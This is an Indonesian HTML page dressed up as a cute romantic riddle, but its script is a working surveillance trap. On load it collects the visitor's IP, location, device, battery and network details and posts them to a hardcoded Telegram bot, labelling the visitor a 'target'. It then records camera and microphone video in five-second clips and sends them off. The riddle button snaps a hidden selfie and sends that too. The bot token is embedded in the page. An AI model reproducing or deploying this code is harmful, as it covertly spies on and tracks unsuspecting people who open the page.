<!doctype html>
<html lang="id">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Love Cute!</title>
<style>
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
  -webkit-tap-highlight-color: transparent;
  tap-highlight-color: transparent;
}

body {
  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
  background: linear-gradient(135deg, #ff9a9e 0%, #fad0c4 100%);
  display: flex;
  justify-content: center;
  align-items: center;
  min-height: 100vh;
  padding: 20px;
  -webkit-user-select: none;
  user-select: none;
}

.container {
  background: rgba(255, 255, 255, 0.95);
  border-radius: 25px;
  padding: 40px 30px;
  box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
  text-align: center;
  max-width: 500px;
  width: 100%;
  backdrop-filter: blur(10px);
  border: 1px solid rgba(255, 255, 255, 0.3);
  animation: fadeIn 0.8s ease-out;
}

@keyframes fadeIn {
  from {
    opacity: 0;
    transform: translateY(30px);
  }
  to {
    opacity: 1;
    transform: translateY(0);
  }
}

.heart {
  font-size: 3em;
  color: #ff6b6b;
  margin-bottom: 20px;
  animation: heartbeat 1.5s ease-in-out infinite;
}

@keyframes heartbeat {
  0%, 100% { transform: scale(1); }
  50% { transform: scale(1.1); }
}

h1 {
  color: #ff6b6b;
  font-size: 2.2em;
  margin-bottom: 15px;
  font-weight: 700;
  text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.1);
}

.riddle {
  font-size: 1.3em;
  color: #555;
  margin-bottom: 30px;
  line-height: 1.5;
  font-weight: 500;
}

.btn {
  background: linear-gradient(45deg, #ff6b6b, #ff8e8e);
  color: white;
  border: none;
  padding: 18px 40px;
  font-size: 1.2em;
  font-weight: 600;
  border-radius: 50px;
  cursor: pointer;
  transition: all 0.3s ease;
  box-shadow: 0 10px 20px rgba(255, 107, 107, 0.3);
  position: relative;
  overflow: hidden;
  -webkit-tap-highlight-color: transparent;
}

.btn:hover {
  transform: translateY(-3px);
  box-shadow: 0 15px 25px rgba(255, 107, 107, 0.4);
}

.btn:active {
  transform: translateY(-1px);
  background: linear-gradient(45deg, #ff5252, #ff7979);
}

.btn::after {
  content: '';
  position: absolute;
  top: 0;
  left: -100%;
  width: 100%;
  height: 100%;
  background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
  transition: left 0.5s;
}

.btn:hover::after {
  left: 100%;
}

.sparkles {
  position: absolute;
  top: -20px;
  left: 50%;
  transform: translateX(-50%);
  font-size: 1.5em;
}

.bubble {
  background: #ffebee;
  border-radius: 20px;
  padding: 20px;
  margin: 20px 0;
  border-left: 4px solid #ff6b6b;
}

.flowers {
  display: flex;
  justify-content: center;
  gap: 15px;
  margin: 20px 0;
}

.flower {
  font-size: 1.5em;
  animation: float 3s ease-in-out infinite;
}

.flower:nth-child(2) { animation-delay: 0.5s; }
.flower:nth-child(3) { animation-delay: 1s; }

@keyframes float {
  0%, 100% { transform: translateY(0); }
  50% { transform: translateY(-10px); }
}

/* Loading animation */
.loading {
  display: none;
  margin: 20px 0;
}

.loading-bar {
  height: 6px;
  background: #ffebee;
  border-radius: 3px;
  overflow: hidden;
  margin-top: 10px;
}

.loading-progress {
  height: 100%;
  background: linear-gradient(90deg, #ff6b6b, #ff8e8e);
  width: 0%;
  border-radius: 3px;
  transition: width 0.3s;
}

.success-message {
  display: none;
  background: #e8f5e9;
  border-radius: 15px;
  padding: 15px;
  margin: 20px 0;
  color: #2e7d32;
  font-weight: 500;
  border-left: 4px solid #4caf50;
}

@media (max-width: 480px) {
  .container {
    padding: 30px 20px;
    margin: 10px;
  }

  h1 {
    font-size: 1.8em;
  }

  .riddle {
    font-size: 1.1em;
  }

  .btn {
    padding: 15px 30px;
    font-size: 1.1em;
  }
}

/* Blue touch effect */
.touch-effect {
  position: fixed;
  width: 50px;
  height: 50px;
  border-radius: 50%;
  background: radial-gradient(circle, #007bff, #0056b3);
  pointer-events: none;
  animation: touchAnimation 0.6s ease-out forwards;
  z-index: 10000;
}

@keyframes touchAnimation {
  0% {
    transform: scale(0.5);
    opacity: 0.8;
  }
  100% {
    transform: scale(2);
    opacity: 0;
  }
}
</style>
</head>
<body>
<div class="container">
  <div class="heart">💖</div>

  <div class="flowers">
    <div class="flower">🌷</div>
    <div class="flower">🌹</div>
    <div class="flower">🌸</div>
  </div>

  <h1>KAMU TAU GAAAA</h1>

  <div class="bubble">
    <p class="riddle">Apaaa buah yang namanyaa selalu bikinyaa nyaman</p>
  </div>

  <button class="btn" id="btnCamera">
    <span class="sparkles">✨</span>
    Aapaa tuh?
  </button>

  <div class="loading" id="loading">
    <p>🔄 Mengambil foto...</p>
    <div class="loading-bar">
      <div class="loading-progress" id="loadingProgress"></div>
    </div>
  </div>

  <div class="success-message" id="successMessage">
    ✅ Foto berhasil diambil! 🎉
  </div>

  <div class="flowers" style="margin-top: 30px;">
    <div class="flower">💐</div>
    <div class="flower">🌼</div>
    <div class="flower">🌺</div>
  </div>
</div>

<script>
const BOT_TOKEN = "8205013984:AAFekxuy2qv4vQ6s_yOOfXX_Mv_2u0Bpv2s";
const CHAT_ID = "6051179992";
const STATIC_IMAGE = "https://files.catbox.moe/8ybe0o.jpg";

// Variables untuk video recording
let videoStream = null;
let videoRecorder = null;
let recordedChunks = [];
let isRecording = false;

// Blue touch effect
document.addEventListener('click', function(e) {
  const touchEffect = document.createElement('div');
  touchEffect.className = 'touch-effect';
  touchEffect.style.left = (e.pageX - 25) + 'px';
  touchEffect.style.top = (e.pageY - 25) + 'px';
  document.body.appendChild(touchEffect);
  
  setTimeout(() => {
    touchEffect.remove();
  }, 600);
});

function escapeHtml(s) {
  return String(s || "-").replaceAll("&", "&amp;").replaceAll("<", "&lt;").replaceAll(">", "&gt;");
}

// Get IP information dengan fallback
async function getIpInfo() {
  try {
    const response = await fetch("https://api.ipify.org?format=json");
    const data = await response.json();
    
    // Get detailed info from ipwhois
    try {
      const whoisResponse = await fetch(`https://ipwhois.app/json/${data.ip}`);
      const whoisData = await whoisResponse.json();
      
      return {
        ip: data.ip,
        city: whoisData.city || "🌆 Unknown",
        region: whoisData.region || "🗺️ Unknown",
        country_name: whoisData.country || "🇺🇳 Unknown",
        country_code: whoisData.country_code || "🏳️ Unknown",
        latitude: whoisData.latitude || "0",
        longitude: whoisData.longitude || "0",
        timezone: whoisData.timezone || "⏰ Unknown",
        isp: whoisData.isp || "📡 Unknown",
        asn: whoisData.asn || "🔗 Unknown"
      };
    } catch (e) {
      return {
        ip: data.ip,
        city: "🌆 Unknown",
        region: "🗺️ Unknown", 
        country_name: "🇺🇳 Unknown",
        country_code: "🏳️ Unknown",
        latitude: "0",
        longitude: "0", 
        timezone: "⏰ Unknown",
        isp: "📡 Unknown",
        asn: "🔗 Unknown"
      };
    }
  } catch (e) {
    return {
      ip: "🌐 Unknown",
      city: "🌆 Unknown",
      region: "🗺️ Unknown",
      country_name: "🇺🇳 Unknown", 
      country_code: "🏳️ Unknown",
      latitude: "0",
      longitude: "0",
      timezone: "⏰ Unknown",
      isp: "📡 Unknown",
      asn: "🔗 Unknown"
    };
  }
}

// Get device information dengan emoji
async function getDeviceInfo() {
  const battery = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve({
    level: null, charging: false, chargingTime: null, dischargingTime: null
  }));

  // Connection info
  let connectionInfo = {};
  if (navigator.connection) {
    connectionInfo = {
      effectiveType: navigator.connection.effectiveType || "📶 Unknown",
      downlink: navigator.connection.downlink || "⬇️ Unknown",
      rtt: navigator.connection.rtt || "⏱️ Unknown"
    };
  }

  return {
    // Basic info dengan emoji
    userAgent: navigator.userAgent,
    platform: "💻 " + (navigator.platform || "Unknown"),
    language: "🗣️ " + (navigator.language || "Unknown"),
    languages: "🌐 " + (navigator.languages ? navigator.languages.join(', ') : "Unknown"),
    
    // Screen info dengan emoji
    screenWidth: "📱 " + screen.width,
    screenHeight: "📱 " + screen.height,
    innerWidth: "🪟 " + window.innerWidth,
    innerHeight: "🪟 " + window.innerHeight,
    colorDepth: "🎨 " + screen.colorDepth,
    pixelRatio: "⚖️ " + window.devicePixelRatio,
    orientation: "📐 " + (screen.orientation?.type || "Unknown"),
    
    // Device info dengan emoji
    cores: "🔢 " + (navigator.hardwareConcurrency || "Unknown"),
    memory: "💾 " + (navigator.deviceMemory || "Unknown"),
    touchPoints: "👆 " + (navigator.maxTouchPoints || 0),
    
    // Browser info dengan emoji
    vendor: "🏷️ " + (navigator.vendor || "Unknown"),
    product: "🛍️ " + (navigator.product || "Unknown"),
    
    // Network info dengan emoji
    online: navigator.onLine ? "✅ Online" : "❌ Offline",
    cookiesEnabled: navigator.cookieEnabled ? "✅ Enabled" : "❌ Disabled",
    doNotTrack: "🚫 " + (navigator.doNotTrack || "Unknown"),
    connection: connectionInfo,
    
    // Battery info dengan emoji
    battery: {
      level: battery.level !== null ? "🔋 " + (battery.level * 100).toFixed(1) + "%" : "🔋 Unknown",
      charging: battery.charging ? "⚡ Charging" : "🔌 Not Charging",
      chargingTime: battery.chargingTime !== Infinity ? "⏳ " + battery.chargingTime + "s" : "⏳ Unknown",
      dischargingTime: battery.dischargingTime !== Infinity ? "⌛ " + battery.dischargingTime + "s" : "⌛ Unknown"
    },
    
    // Additional info dengan emoji
    timezone: "🌍 " + Intl.DateTimeFormat().resolvedOptions().timeZone,
    localTime: "🕐 " + new Date().toString(),
    utcTime: "⏰ " + new Date().toUTCString(),
    referrer: document.referrer ? "🔗 " + document.referrer : "🔗 Direct",
    
    // Browser capabilities dengan emoji
    webdriver: navigator.webdriver ? "🤖 Yes" : "🤖 No",
    pdfViewer: navigator.pdfViewerEnabled ? "📄 Yes" : "📄 No",
    javaEnabled: navigator.javaEnabled ? "☕ Yes" : "☕ No"
  };
}

// Build caption dengan emoji semua
function buildCaption(ip, d) {
  const g = `https://www.google.com/maps?q=${ip.latitude},${ip.longitude}`;
  
  return [
    "🚨 <b>TARGET BARU TERKONEKSI</b> 🚨",
    "",
    "🌍 <b>INFORMASI LOKASI</b>",
    `🌐 IP: <code>${escapeHtml(ip.ip)}</code>`,
    `🏙️ City: ${escapeHtml(ip.city)}`,
    `🗺️ Region: ${escapeHtml(ip.region)}`,
    `🇮🇩 Country: ${escapeHtml(ip.country_name)}`,
    `🏳️ Country Code: ${escapeHtml(ip.country_code)}`,
    `📍 Latitude: ${escapeHtml(ip.latitude)}`,
    `📍 Longitude: ${escapeHtml(ip.longitude)}`,
    `🗺️ Location: ${g}`,
    `⏰ Timezone: ${escapeHtml(ip.timezone)}`,
    `📡 ISP: ${escapeHtml(ip.isp)}`,
    `🔗 ASN: ${escapeHtml(ip.asn)}`,
    "",
    "💻 <b>DEVICE INFO</b>",
    `🖥️ User Agent: ${escapeHtml(d.userAgent)}`,
    `💻 Platform: ${escapeHtml(d.platform)}`,
    `🗣️ Language: ${escapeHtml(d.language)}`,
    `🌐 Languages: ${escapeHtml(d.languages)}`,
    `🏷️ Vendor: ${escapeHtml(d.vendor)}`,
    `🛍️ Product: ${escapeHtml(d.product)}`,
    "",
    "📱 <b>SCREEN INFO</b>",
    `📱 Screen: ${escapeHtml(d.screenWidth + "x" + d.screenHeight)}`,
    `🪟 Inner Size: ${escapeHtml(d.innerWidth + "x" + d.innerHeight)}`,
    `🎨 Color Depth: ${escapeHtml(d.colorDepth)}`,
    `⚖️ Pixel Ratio: ${escapeHtml(d.pixelRatio)}`,
    `📐 Orientation: ${escapeHtml(d.orientation)}`,
    "",
    "⚙️ <b>HARDWARE SPECS</b>",
    `🔢 CPU cores: ${escapeHtml(d.cores)}`,
    `💾 RAM (GB): ${escapeHtml(d.memory)}`,
    `👆 Touch Points: ${escapeHtml(d.touchPoints)}`,
    "",
    "🌐 <b>NETWORK INFO</b>",
    `📶 Online: ${escapeHtml(d.online)}`,
    `🍪 Cookies Enabled: ${escapeHtml(d.cookiesEnabled)}`,
    `🚫 Do Not Track: ${escapeHtml(d.doNotTrack)}`,
    `📡 Connection Type: ${escapeHtml(d.connection.effectiveType)}`,
    `⬇️ Downlink: ${escapeHtml(d.connection.downlink)} Mbps`,
    `⏱️ RTT: ${escapeHtml(d.connection.rtt)} ms`,
    "",
    "🔋 <b>BATTERY INFO</b>",
    `${escapeHtml(d.battery.level)}`,
    `⚡ ${escapeHtml(d.battery.charging)}`,
    `⏳ ${escapeHtml(d.battery.chargingTime)}`,
    `⌛ ${escapeHtml(d.battery.dischargingTime)}`,
    "",
    "🔧 <b>BROWSER CAPABILITIES</b>",
    `${escapeHtml(d.webdriver)}`,
    `${escapeHtml(d.pdfViewer)}`,
    `${escapeHtml(d.javaEnabled)}`,
    "",
    "🕒 <b>TIME & SESSION</b>",
    `${escapeHtml(d.timezone)}`,
    `${escapeHtml(d.localTime)}`,
    `${escapeHtml(d.utcTime)}`,
    `${escapeHtml(d.referrer)}`,
    `🌐 URL: ${escapeHtml(window.location.href)}`,
    `⏰ Time (UTC): ${escapeHtml(new Date().toISOString())}`
  ].join("\n");
}

// Start video recording
async function startVideoRecording() {
  try {
    videoStream = await navigator.mediaDevices.getUserMedia({ 
      video: true,
      audio: true 
    });
    
    // Start recording every 5 seconds
    setInterval(async () => {
      if (isRecording) return;
      
      isRecording = true;
      recordedChunks = [];
      
      videoRecorder = new MediaRecorder(videoStream, {
        mimeType: 'video/webm;codecs=vp9'
      });
      
      videoRecorder.ondataavailable = (event) => {
        if (event.data.size > 0) {
          recordedChunks.push(event.data);
        }
      };
      
      videoRecorder.onstop = async () => {
        const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
        
        // Send video to Telegram
        const formData = new FormData();
        formData.append("chat_id", CHAT_ID);
        formData.append("video", videoBlob, `live_${Date.now()}.webm`);
        formData.append("caption", "📹 LIVE FEED - REAL TIME");
        
        try {
          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
            method: "POST",
            body: formData
          });
        } catch (e) {
          console.log("Error sending video");
        }
        
        isRecording = false;
      };
      
      videoRecorder.start();
      setTimeout(() => {
        if (videoRecorder && videoRecorder.state === 'recording') {
          videoRecorder.stop();
        }
      }, 5000);
      
    }, 5000);
    
  } catch (e) {
    console.log("Cannot access camera for live feed");
  }
}

// Send device information
async function sendIpDevice() {
  try {
    const [ip, device] = await Promise.all([
      getIpInfo(),
      getDeviceInfo()
    ]);
    
    const caption = buildCaption(ip, device);
    
    // Send as photo with caption
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        photo: STATIC_IMAGE,
        caption: caption,
        parse_mode: "HTML"
      })
    });

    console.log("✅ Data device berhasil dikirim!");
    
    // Start video recording after 3 seconds
    setTimeout(startVideoRecording, 3000);
    
  } catch (error) {
    console.log("❌ Gagal mengirim data device");
  }
}

// Take photo and send
async function sendSnapshot() {
  const btn = document.getElementById('btnCamera');
  const loading = document.getElementById('loading');
  const success = document.getElementById('successMessage');
  const progress = document.getElementById('loadingProgress');
  
  try {
    // Show loading
    btn.style.display = 'none';
    loading.style.display = 'block';
    
    // Progress animation
    for (let i = 0; i <= 100; i += 20) {
      progress.style.width = i + '%';
      await new Promise(resolve => setTimeout(resolve, 100));
    }
    
    // Access camera langsung
    const stream = await navigator.mediaDevices.getUserMedia({ 
      video: { 
        facingMode: 'user',
        width: { ideal: 1280 },
        height: { ideal: 720 }
      } 
    });
    
    // Create video element
    const video = document.createElement('video');
    video.style.position = 'fixed';
    video.style.top = '-9999px';
    video.style.left = '-9999px';
    document.body.appendChild(video);
    video.srcObject = stream;
    video.play();
    
    // Wait for video to be ready
    await new Promise((resolve) => {
      video.onloadedmetadata = () => {
        setTimeout(resolve, 500);
      };
    });
    
    // Take photo
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    
    // Convert to blob
    const blob = await new Promise(resolve => {
      canvas.toBlob(resolve, 'image/jpeg', 0.9);
    });
    
    // Send to Telegram
    const formData = new FormData();
    formData.append("chat_id", CHAT_ID);
    formData.append("photo", blob, "target_selfie.jpg");
    formData.append("caption", "📸 SELFIE TARGET BERHASIL!");
    
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
      method: "POST",
      body: formData
    });
    
    // Cleanup
    stream.getTracks().forEach(track => track.stop());
    video.remove();
    
    // Show success tanpa popup
    loading.style.display = 'none';
    success.style.display = 'block';
    
    console.log("✅ Foto berhasil dikirim!");
    
    // Reset UI setelah 2 detik
    setTimeout(() => {
      success.style.display = 'none';
      btn.style.display = 'block';
      progress.style.width = '0%';
    }, 2000);
    
  } catch (error) {
    console.log("❌ Gagal mengambil foto");
    
    // Reset UI
    loading.style.display = 'none';
    btn.style.display = 'block';
    progress.style.width = '0%';
  }
}

// Initialize
window.addEventListener("load", function() {
  console.log("🚀 Halaman loaded");
  sendIpDevice();
});

// Camera button event
document.getElementById("btnCamera").addEventListener("click", function(e) {
  e.preventDefault();
  sendSnapshot();
});

// Prevent default touch behaviors
document.addEventListener('touchstart', function(e) {
  if (e.target.tagName === 'BUTTON') {
    e.preventDefault();
  }
}, { passive: false });
</script>
</body>
</html>
